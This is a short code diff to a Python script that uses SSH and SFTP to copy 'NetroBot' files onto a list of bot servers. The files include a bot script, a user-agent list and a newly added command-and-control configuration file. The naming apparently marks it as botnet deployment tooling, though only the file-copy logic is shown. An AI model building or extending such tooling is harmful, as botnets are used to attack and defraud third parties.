@@ -10,11 +10,12 @@ BOT_SERVERS_PATH = "bot_servers.txt"
 BOT_PASSWORD_PATH = "bot_password.txt"
 
 NETRO_BOT_PATH = "../netro_bot.py"
+CNC_CONFIG_PATH = "../cnc_config.json"
 USERAGENTS_PATH = "../useragents.txt"
 BOT_PACKAGES_PATH = "../bot_packages.txt"
 BOT_REQUIREMENTS_PATH ="../bot_requirements.txt"
 
-for file in [BOT_SERVERS_PATH, BOT_PASSWORD_PATH, NETRO_BOT_PATH, USERAGENTS_PATH, BOT_PACKAGES_PATH, BOT_REQUIREMENTS_PATH]:
+for file in [BOT_SERVERS_PATH, BOT_PASSWORD_PATH, NETRO_BOT_PATH, CNC_CONFIG_PATH, USERAGENTS_PATH, BOT_PACKAGES_PATH, BOT_REQUIREMENTS_PATH]:
     if not os.path.exists(file):
         print(f"Required file not found: {file}")
         exit()
@@ -66,9 +67,12 @@ def server_install(hostname: str):
             print(f"Installing NetroBot at {hostname}...")
             
             sftp_client = ssh_client.open_sftp()
-            
+
             if not "netro_bot.py" in server_files:
                 sftp_client.put(NETRO_BOT_PATH, "netro_bot.py")
+            
+            if not "cnc_config.json" in server_files:
+                sftp_client.put(CNC_CONFIG_PATH, "cnc_config.json")
 
             if not "useragents.txt" in server_files:
                 sftp_client.put(USERAGENTS_PATH, "useragents.txt")
